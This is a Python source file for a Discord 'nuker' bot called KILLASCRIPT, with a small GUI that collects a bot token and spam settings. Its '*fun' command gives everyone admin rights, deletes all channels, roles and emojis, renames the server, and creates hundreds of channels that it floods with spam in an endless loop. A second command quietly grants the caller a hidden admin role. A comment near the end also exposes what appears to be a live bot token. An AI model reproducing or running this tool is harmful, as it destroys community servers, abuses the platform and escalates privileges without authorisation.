# packages
import discord
from discord.ext import commands
import customtkinter
from tkinter import messagebox

prefix = "*"

customtkinter.set_appearance_mode("light")


UI = customtkinter.CTk()
UI.title("killascript | prefix: *")
UI.iconbitmap("killaimage.ico")

app_width = 500
app_height = 400

screenw = UI.winfo_screenwidth()
screenh = UI.winfo_screenheight()
x = (screenw / 2) - (app_width / 2)
y = (screenh / 2) - (app_height / 2)

UI.geometry(f'{app_width}x{app_height}+{int(x)}+{int(y)}')

main = customtkinter.CTkFrame(master=UI)
main.pack(fill="both", expand=True)


def startup():
    TKN: str = UI1.TOKE.get()
    NME: str = UI1.name.get()
    SPM: str = UI1.spmmsg.get()
    SPC: str= UI1.spamc.get()

    if TKN == "":
        messagebox.showinfo("killascript | prefix: *", "Please fill in all fields!")
        return

    if NME == "":
        messagebox.showinfo("killascript | prefix: *", "Please fill in all fields!")
        return

    if SPM == "":
        messagebox.showinfo("killascript | prefix: *", "Please fill in all fields!")
        return

    if SPC == "":
        messagebox.showinfo("killascript | prefix: *", "Please fill in all fields!")
        return

    else:
        pass


    messagebox.showinfo("killascript | prefix: *", "Everything is set, Please go to the terminal for further instruction")
    UI.destroy()

    # intents = discord.Intents.all()
    Bot = commands.Bot(command_prefix=prefix,
                       help_command=None, intents=discord.Intents.all())

    @Bot.event
    async def on_ready():
        print(f"The console is now online for nuker: {Bot.user}")
        print(f"Bot Prefix: {prefix}")
        print("---commands---")
        print(f"{prefix}fun - Nuke command")
        print(f"{prefix}AD - Gives person who runs command admin")

    @Bot.command(name="fun")
    async def fun(ctx):

        await ctx.message.delete()  # GIVES @EVERYONE ADMIN
        g = ctx.guild
        rle = discord.utils.get(g.roles, name="@everyone")
        try:
            await rle.edit(permissions=discord.Permissions.all())
            print(f"[+] GRANTED '@everyone' ADMIN PERMS")
        except Exception as e:
            print(f"[-] COULD NOT GRANT '@everyone' ADMIN PERMS: {e}")# grants @everyone admin perms

        for eji in list(g.emojis):
            try:
                await eji.delete()
                print(f"[+] EMOJI {eji} DELETED")
            except Exception as e:
                print(f"[-] DELETE EMOJI ERROR: {e}")# deletes emojis

        for chan in g.channels:
            try:
                await chan.delete()
                print(f"[+] CHANNEL {chan} DELETED")
            except Exception as e:
                print(f"[-] DELETE CHANNEL ERROR: {e}")# deletes channels
            else:
                pass

        try:
            await ctx.guild.edit(name=NME)
            print(f"[+] RENAMED SERVER: {NME}")
        except Exception as e:
            print(f"[-] RENAME SERVER ERROR: {e}")# renames server

        for role in g.roles:
            try:
                await role.delete()
                print(f"[+] ROLE {role} DELETED")
            except Exception as e:
                print(f"[-] DELETE ROLE ERROR: {e}")# deletes roles
            else:
                pass

        try:
            amount = 500
            for i in range(amount):
                await g.create_text_channel(SPC)
                print(f"[+] CREATED CHANNEL")
                await g.create_text_channel(SPC)
                print(f"[+] CREATED CHANNEL")
        except Exception as e:
            print(f"[-] CREATE CHANNEL ERROR: {e}")# creates spam channels



    @Bot.command(name="AD")  # CREATES PRIVATE ROLE WITH ADMIN PERMS FOR PERSON WHO RUNS COMMAND
    async def AD(ctx):
        await ctx.message.delete()
        g = ctx.guild
        auth = ctx.message.author
        try:
            role = await g.create_role(name=".", permissions=discord.Permissions(8))
            await auth.add_roles(role)
            print(f"[+] GIVEN ADMIN TO {auth}")
        except Exception as e:
            print(f"[-] COULD NOT GIVE USER {auth} ADMIN: {e}")

    @Bot.event  # SENDS SPAM MESSAGES TO SPAM CHANNELS
    async def on_guild_channel_create(channel):
        while True:
            await channel.send(SPM)
            print(f"[+] SPAM MESSAGE SENT")

    @Bot.event
    async def on_command_error(ctx, error):
        if isinstance(error, commands.CommandNotFound):
            print("[-] Error: Command not found")# command not found eroor

    @Bot.event
    async def on_command_error(ctx, error):
        if isinstance(error, commands.BotMissingRole):
            print("[-] Error: Command not found")# bot doesn't have permissions error

    Bot.run(TKN)

class UI1():

    # Labels

    req1 = customtkinter.CTkLabel(master=main,
                                  text="Please fill in the following fields with correct information:",
                                  text_font=("Arial", 10))
    req1.place(relx=0.05, rely=0.2)

    chanlabel = customtkinter.CTkLabel(master=main,
                                     text="Spam channel name", text_font=("Arial", 10))
    chanlabel.place(relx=0.48, rely=0.7)

    tokenlabel = customtkinter.CTkLabel(master=main,
                                      text="Your Bot Token", text_font=("Arial", 10))
    tokenlabel.place(relx=0.01, rely=0.3)

    namelabel = customtkinter.CTkLabel(master=main,
                                       text="Desired server name", text_font=("Arial", 10))
    namelabel.place(relx=0.04, rely=0.5)

    Titlelabel = customtkinter.CTkLabel(master=main,
                                   text="KILLASCRIPT Nuke Tool", text_font=("Arial", 15))
    Titlelabel.place(relx=0.05, rely=0.1)

    spmmsglabel = customtkinter.CTkLabel(master=main,
                                     text="Spam message", text_font=("Arial", 10))
    spmmsglabel.place(relx=0.455, rely=0.5)

    # Entry fields

    spamc = customtkinter.CTkEntry(UI, bg='lightgray',
                                       placeholder_text="Enter Spam Channel Name", bg_color="light grey", borderwidth=2, width=200)
    spamc.place(relx=0.5, rely=0.8)

    spmmsg = customtkinter.CTkEntry(UI, bg='lightgray',
                                         placeholder_text="Enter Spam Message", bg_color="light grey",  borderwidth=2,width=200)
    spmmsg.place(relx=0.5, rely=0.6)

    TOKE = customtkinter.CTkEntry(UI, bg='lightgray',
                                       placeholder_text="Enter Bot Token", bg_color="light grey",  borderwidth=2, width=425)
    TOKE.place(relx=0.05, rely=0.4)

    name = customtkinter.CTkEntry(UI, bg='lightgray',
                                      placeholder_text="Enter New Server Name", bg_color="light grey", borderwidth=2, width=200)
    name.place(relx=0.05, rely=0.6)

    # Buttons

    confirm = customtkinter.CTkButton(UI, fg_color="#9CA39C", bg_color="light grey",
                                          text="        confirm         ", command=startup)
    confirm.place(relx=0.1, rely=0.78)

# ODk3MzU3NDk0Mjk1MzQ3MjIx.G7K_7b.yf7wJspE08N7jEFZKu-kSBrhxeEUbj9oc5tm4I


UI.mainloop()